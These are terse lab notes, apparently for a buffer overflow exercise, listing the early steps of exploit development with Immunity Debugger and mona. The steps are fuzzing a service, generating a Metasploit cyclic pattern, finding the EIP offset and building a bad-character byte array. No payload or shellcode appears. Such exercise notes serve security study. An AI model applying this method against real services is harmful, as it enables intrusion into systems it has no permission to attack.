//BOf

setup MONA:
//In immunity: 
!mona config -set workingfolder c:\mona\%p

//On attacker: 
run fuzzer.py

//you should see an error like: "Could not connect to MACHINE_IP:PORT". Make a note of the largest number of bytes that were sent.

//Run exploit.py 

//Run the following command to generate a cyclic pattern of a length 400 bytes longer that the string that crashed the server (change the -l value to this):

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <crash length + 400>


// in Immunity: !mona findmsp -distance <pattern length>

//Look for : "EIP contains normal pattern : ... (offset XXXX)"

//Update exploit.py; set <offset> to offset value found above then set <retn> variable to "BBBB"

//In immunity
!mona bytearray -b "\x00"
